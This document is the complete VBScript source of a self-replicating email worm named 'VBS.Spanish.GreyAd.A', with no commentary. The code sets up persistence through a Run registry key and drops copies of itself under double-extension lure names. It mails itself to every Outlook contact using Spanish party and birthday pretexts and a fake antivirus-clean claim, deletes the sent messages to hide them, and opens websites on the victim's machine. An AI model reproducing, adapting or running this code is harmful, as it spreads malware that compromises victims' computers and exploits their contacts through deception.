   Dim Dime(5), Cuentame(5), Filez(5)
   Randomize
   Dime(0) = "Mi cumpleaños!!"
   Dime(1) = "Mi herman se casa!!"
   Dime(2) = "Fiesta en mi casa!!!"
   Dime(3) = "Te vienes al cine?"
   Dime(4) = "Quedamos para comer"
   Dime(5) = ""
   Cuentame(0) = "Ayer fue mi cumpleaños te mando las fotos de la fiesta"
   Cuentame(1) = "Pues si, al final ha decidido casarse, aquí tienes la foto oficial de los dos..."
   Cuentame(2) = "Vamos a quedar tod@s para organizar una fiestorra en mi casa, aquí te mando lo que tienes que traer tu"
   Cuentame(3) = "Pues eso, la panda queremos quedar para ir al cine a ver alguno de los ultimos estrenos, elige uno o dos de la lista"
   Cuentame(4) = "Como hace tiempo que no quedamos, podemos organizar una comida, he pensado en toda esta gente (ver fichero) como ves ?"
   Cuentame(5) = "[McAfee Virus NOT Detected] Watch the real mail on the attached file"
   Filez(0) = "Fotos_Cumple.zip.zip.vbs"
   Filez(1) = "Foto_Novios.vbs"
   Filez(2) = "Fiesta.vbs"
   Filez(3) = "Pelicuas.vbs"
   Filez(4) = "Comida.vbs"
   Filez(5) = "e_mail.vbs"
   Set FSO = CreateObject("Scripting.FileSystemObject")
   Tempo = FSO.GetSpecialFolder(2)
   BiruzNombre = Tempo & "\VBS.Spanish.GreyAd.A.vbs"
   Set WSShell = CreateObject("WScript.Shell")
   WSShell.RegWrite "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\GreyAd", "wscript.exe " & BiruzNombre & " %"
   FSO.CopyFile WScript.ScriptFullName, BiruzNombre
   FSO.CopyFile WScript.ScriptFullName, Filez(0)
   FSO.CopyFile WScript.ScriptFullName, Filez(1)
   FSO.CopyFile WScript.ScriptFullName, Filez(2)
   FSO.CopyFile WScript.ScriptFullName, Filez(3)
   FSO.CopyFile WScript.ScriptFullName, Filez(4)
   FSO.CopyFile WScript.ScriptFullName, Filez(5)
   Payload
   If WSShell.RegRead("HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\VBS.Spanish.GreyAd.A\SpainishMania") <> 1 Then
   Spread
   End If

   Function Spread()
   Set OLApp = CreateObject("Outlook.Application")
   If OLApp = "Outlook" Then
   Set MAPINS = OLApp.GetNameSpace("MAPI")
   Set AddressLists = MAPINS.AddressLists
   For Each List In AddressLists
   RandomNumber = (Rnd + 314) Mod 6
   If List.AddressEntries.Count <> 0 Then
   CCT = List.AddressEntries.Count
   For CC = 1 To CCT
     Set OLAppItem = OLApp.CreateItem(0)
     Set AddressEntries= List.AddressEntries(CC)
     OLAppItem.To = AddressEntries.Address
     OLAppItem.Body = Cuentame(RandomNumber)
     OLAppItem.Subject = Dime(RandomNumber)
     Set Adjuntos = OLAppItem.Attachments
     Attachment = Filez(RandomNumber)
     OLAppItem.DeleteAfterSubmit = True
     Adjuntos.Add Attachment
     If OLAppItem.To <> "" Then
        OLAppItem.Send
     End If
   Next
   End If
   Next
   End If
   End function

   Function Payload()
      WSShell.Run "http://www.yonkis.com",false
      WSShell.Run "http://www.putalocura.com",false
      WSShell.Run "http://www.fresonmagic.com",false
   End Function
